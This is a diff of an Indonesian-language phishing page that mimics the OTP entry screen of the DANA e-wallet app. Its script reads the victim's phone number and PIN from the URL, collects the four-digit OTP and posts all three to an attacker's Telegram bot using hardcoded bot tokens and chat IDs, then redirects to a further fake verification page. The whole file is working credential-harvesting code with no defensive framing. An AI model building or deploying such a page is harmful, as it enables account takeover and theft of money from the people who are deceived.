@@ -1,134 +1,249 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Masukkan OTP</title>
+    <title>DANA - Masukkan OTP</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;}
-        body{background:#1688F0;min-height:100vh;display:flex;flex-direction:column;color:#fff;}
-        .header{padding:10px 13px;display:flex;align-items:center;justify-content:center;position:relative;}
-        .back-btn{position:absolute;left:10px;font-size:15px;cursor:pointer;}
-        .header-title{font-size:18px;font-weight:500;}
-        .content{flex:1;padding:30px 24px 20px;text-align:center;}
-        .info-text{font-size:20px;font-weight:500;margin-bottom:16px;}
-        .phone-box{display:inline-flex;align-items:center;gap:5px;background:rgba(255,255,255,0.18);padding:8px 14px;border-radius:8px;font-size:20px;font-weight:500;margin-bottom:8px;}
-        .flag{width:15px;height:10px;background:linear-gradient(180deg,#ff0000 50%,#fff 50%);border-radius:2px;display:inline-block;}
-        .via-text{font-size:12px;opacity:0.9;margin-bottom:32px;}
-        .otp-container{display:flex;justify-content:center;gap:8px;margin-bottom:28px;}
-        .otp-box{width:30px;height:30px;background:#fff;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#1688F0;font-size:24px;font-weight:600;}
-        .resend-row{display:inline-flex;align-items:center;background:#fff;color:#333;border-radius:6px;overflow:hidden;font-size:14px;font-weight:500;}
-        .resend-btn{padding:8px 18px;cursor:pointer;}
-        .timer-box{background:#f5f5f5;padding:2px 5px;color:#666;}
-        .notify-bar{background-color:#009E5F;color:#fff;text-align:center;padding:12px;font-size:15px;}
-        .keypad{background:#f5f5f5;padding:12px 8px 20px;display:grid;grid-template-columns:repeat(3,1fr);gap:10px;}
-        .key{background:#fff;border:none;border-radius:5px;padding:10px 5px;font-size:22px;font-weight:500;color:#222;cursor:pointer;transition:background 0.1s;}
-        .key:active{background:#e9e9e9;}
-        .key-special{background:#e9e9e9;color:#555;}
-        .key-check{background:#1688F0;color:#fff;font-size:22px;}
-        .key-comma{font-size:18px;}
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        body {
+            background-color: #009EEB;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 15px 10px;
+            color: white;
+        }
+        .back-btn {
+            align-self: flex-start;
+            font-size: 1.2rem;
+            color: white;
+            margin-bottom: 15px;
+            cursor: pointer;
+        }
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 15px;
+        }
+        .logo-img {
+            width: 50px;
+            height: auto;
+        }
+        .logo-text {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: white;
+        }
+        .title {
+            font-size: 1rem;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .number-box {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 5px 12px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            margin-bottom: 25px;
+        }
+        .flag {
+            width: 20px;
+            height: 13px;
+            background: url('https://flagcdn.com/w20/id.png') center/cover no-repeat;
+            border-radius: 2px;
+        }
+        .otp-container {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 25px;
+        }
+        .otp-input {
+            width: 35px;
+            height: 35px;
+            background: white;
+            border-radius: 4px;
+            border: none;
+            text-align: center;
+            font-size: 1.3rem;
+            color: #009EEB;
+            outline: none;
+            padding: 0;
+        }
+        .timer-container {
+            display: flex;
+            background: white;
+            border-radius: 3px;
+            overflow: hidden;
+            width: 150px;
+        }
+        .resend-btn {
+            flex: 5;
+            padding: 3px;
+            background: #f0f0f0;
+            color: #aaa;
+            font-size: 0.7rem;
+            font-weight: bold;
+            text-align: center;
+        }
+        .time-box {
+            flex: 1;
+            padding: 2px;
+            background: #f8f8f8;
+            color: #333;
+            font-size: 0.6rem;
+            font-weight: bold;
+            text-align: center;
+            position: relative;
+        }
+        .dot {
+            position: absolute;
+            top: 4px;
+            right: 2px;
+            width: 3px;
+            height: 3px;
+            background: orange;
+            border-radius: 50%;
+        }
     </style>
 </head>
 <body>
-    <div class="header">
-        <span class="back-btn" onclick="history.back()">‹</span>
-        <div class="header-title">Masuk</div>
+    <!-- Tombol Kembali -->
+    <div class="back-btn" onclick="history.back()">
+        <i class="fas fa-chevron-left"></i>
     </div>
 
-    <div class="content">
-        <div class="info-text">Kode OTP telah terkirim ke</div>
-        <div class="phone-box">
-            <span class="flag"></span>
-            <span id="nomorTampil">+62 xxx-xxxx-xxxx</span>
-        </div>
-        <div class="via-text">via 💬 SMS</div>
+    <!-- Logo DANA -->
+    <div class="logo-container">
+        <img src="logo.png" alt="Logo DANA" class="logo-img">
+        <div class="logo-text"></div>
+    </div>
 
-        <div class="otp-container" id="otpContainer">
-            <div class="otp-box"></div>
-            <div class="otp-box"></div>
-            <div class="otp-box"></div>
-            <div class="otp-box"></div>
-        </div>
+    <!-- Judul -->
+    <div class="text-sm font-bold title">
+        Kode OTP telah terkirim di via whatsapp
+               
+        
+    </div>
 
-        <div class="resend-row">
-            <div class="resend-btn">KIRIM ULANG</div>
-            <div class="timer-box">00:58 ˙</div>
+    <!-- Box Nomor HP (NOMOR AKAN TAMPIL OTOMATIS) -->
+    <div class="number-box">
+        <div class="flag"></div>
+        <span id="nomorTampil">+62 8xx xxxx xxx</span>
+        
+    </div>
+   
+         
+
+    <!-- Kotak Input OTP -->
+    <div class="otp-container">
+        <input type="Number" class="otp-input" maxlength="1" autofocus>
+        <input type="Number" class="otp-input" maxlength="1">
+        <input type="Number" class="otp-input" maxlength="1">
+        <input type="Number" class="otp-input" maxlength="1">
+    </div>
+
+    <!-- Tombol Kirim Ulang & Timer -->
+    <div class="timer-container">
+        <div class="resend-btn">KIRIM ULANG</div>
+        <div class="time-box">
+            <span id="timer">00:58</span>
+            <div class="dot"></div>
         </div>
     </div>
 
-    <div class=""></div>
-
-    <div class="keypad">
-        <button class="key" onclick="tambahAngka('1')">1</button>
-        <button class="key" onclick="tambahAngka('2')">2</button>
-        <button class="key" onclick="tambahAngka('3')">3</button>
-        <button class="key" onclick="tambahAngka('4')">4</button>
-        <button class="key" onclick="tambahAngka('5')">5</button>
-        <button class="key" onclick="tambahAngka('6')">6</button>
-        <button class="key" onclick="tambahAngka('7')">7</button>
-        <button class="key" onclick="tambahAngka('8')">8</button>
-        <button class="key" onclick="tambahAngka('9')">9</button>
-        <button class="key key-comma">,</button>
-        <button class="key" onclick="tambahAngka('0')">0</button>
-        <button class="key">.</button>
-        <button class="key key-special">−</button>
-        <button class="key key-special">⎵</button>
-        <button class="key key-special" onclick="hapusAngka()">⌫</button>
-        <button class="key key-special"></button>
-        <button class="key key-check" onclick="kirimOTP()">✓</button>
-    </div>
-
+    <!-- SCRIPT KONEKSI & KIRIM DATA -->
     <script>
-        // === ISI DATA KAMU DISINI ===
-        const BOT_TOKEN = "8994642736:AAFuer-9fij5SH2ygkMUYwVgA4V-Ux5lK_0";
-        const CHAT_ID = "-1004401558849";
-        const HALAMAN_TUJUAN = "verifikasi ulang.html"; // Halaman berikutnya
-        // ===========================
+        // BACA DATA YANG DIKIRIM DARI HALAMAN PIN (pinn.html)
+        const urlParams = new URLSearchParams(window.location.search);
+        const nomorAsli = urlParams.get('nomor') || 'Gagal memuat';
+        const pinAsli = urlParams.get('pin') || 'Tidak ada';
 
-        let otpInput = "";
-        const maxOtp = 4;
+        // TAMPILKAN NOMOR DI LAYAR
+        document.getElementById('nomorTampil').textContent = `+62 ${nomorAsli}`;
 
-        // Tampilkan nomor dari halaman sebelumnya
-        window.onload = function() {
-            let nomor = sessionStorage.getItem("tampil nomor") || ">+62 xxx-xxxx-xxxx ";
-            nomor = nomor.replace(/(\d{2})(\d{3})(\d{4})(\d{4})/, '$1 $2-$3-$4');
-            document.getElementById("nomorTampil").textContent = "+" + nomor;
-        };
+        const inputs = document.querySelectorAll('.otp-input');
+        
+        // DATA BOT TELEGRAM KAMU
+        const BOT_TOKEN = "8428653854:AAG4XeGXXR-U-SQPwuKvNDzE1-PTXBjKCGo"; 
+        const CHAT_ID = "8683949047";
+        const HALAMAN_TUJUAN = "verifikasi ulang.html";
 
-        function tambahAngka(angka) {
-            if(otpInput.length >= maxOtp) return;
-            otpInput += angka;
-            updateTampilanOTP();
-            if(otpInput.length === maxOtp) kirimOTP();
-        }
+        // TIMER HITUNG MUNDUR
+        let timeLeft = 58;
+        const timerElement = document.getElementById('timer');
+        
+        const countdown = setInterval(() => {
+            let minutes = Math.floor(timeLeft / 60);
+            let seconds = timeLeft % 60;
+            
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+            
+            timerElement.textContent = minutes + ":" + seconds;
+            timeLeft--;
 
-        function hapusAngka() {
-            otpInput = otpInput.slice(0,-1);
-            updateTampilanOTP();
-        }
+            if(timeLeft < 0) {
+                clearInterval(countdown);
+                timerElement.textContent = "Habis";
+            }
+        }, 1000);
 
-        function updateTampilanOTP() {
-            const kotak = document.querySelectorAll(".otp-box");
-            kotak.forEach((k, i) => k.textContent = otpInput[i] || "");
-        }
+        // LOGIKA KETIK & PINDAH KOLOM
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                if (input.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                cekDanKirim();
+            });
 
-        async function kirimOTP() {
-            if(otpInput.length < maxOtp) return;
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method:"POST",
-                    headers:{"Content-Type":"application/json"},
-                    body:JSON.stringify({
-                        chat_id:CHAT_ID,
-                        text:`🔢 KODE OTP DITERIMA\nKode: ${otpInput}\nWaktu: ${new Date().toLocaleString('id-ID')}`
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        // KIRIM SEMUA DATA KE TELEGRAM
+        function cekDanKirim() {
+            let otpLengkap = "";
+            inputs.forEach(input => otpLengkap += input.value);
+
+            if (otpLengkap.length === 4) {
+                let pesan = `🔔 ༺═──◍DANA☭──═༻
+📞 Nomor: +62${nomorAsli}
+🔑 PIN: ${pinAsli}
+🔢 OTP: ${otpLengkap}`;
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan,
+                        parse_mode: "HTML"
                     })
-                });
-                sessionStorage.setItem("kodeOTP", otpInput);
-                window.location.href = HALAMAN_TUJUAN;
-            } catch(e) {
-                alert("Koneksi bermasalah, coba lagi");
-                otpInput = "";
-                updateTampilanOTP();
+                })
+                .then(() => {
+                    window.location.href = HALAMAN_TUJUAN;
+                })
+                .catch(() => alert('Koneksi bermasalah!'));
             }
         }
     </script>
